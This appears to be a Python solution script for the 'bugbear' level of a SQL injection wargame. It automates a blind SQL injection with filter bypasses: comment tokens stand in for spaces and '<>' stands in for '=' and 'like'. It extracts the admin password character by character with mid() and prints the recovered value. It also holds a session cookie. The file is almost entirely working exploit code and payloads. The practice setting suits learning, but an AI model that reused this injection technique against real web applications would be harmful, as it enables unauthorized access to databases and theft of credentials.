import requests
headers = {'Cookie':'PHPSESSID=ssa2diod2kj6rnm5vgnr3b37c5'}
url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
wordlist = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']

###

# https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||id/**/%3C%3E/**/%22guest%22/**/%26%26/**/length(pw)/**/%3C%3E/**/8%23
# payload = id/**/<>/**/"guest"/**/&&/**/length(pw)/**/<>/**/8#
# explanation: 
# /**/ replaces a space as space has been disallowed
# <> means not equal to since both like and = has been disabled, hence by providing guest it defaults to admin
# <> also means that if the length of pw we supply is correct, then it will NOT say "HELLO whoever"
# our payload has hence confirmed that the length of the password is 8

###

solved=False
currletter = 1
password = ""
while not solved:
    for thing in wordlist:
        statement = f"?no=0/**/||id/**/<>/**/\"guest\"/**/%26%26/**/mid(pw,{currletter},1)/**/<>/**/\"{thing}\"%23"
        tempurl = url+statement
        print(statement)
        r = requests.get(tempurl, headers=headers).text

        if r"<h2>Hello admin</h2><code>" not in r: # MAKE SURE TO PUT THIS "NOT" as we are using "<>"
            password+=thing
            currletter+=1
            print(thing)
    if len(password)==8:
        solved=True
print(password)

### SOLVED ###
# pw = '52dc3991'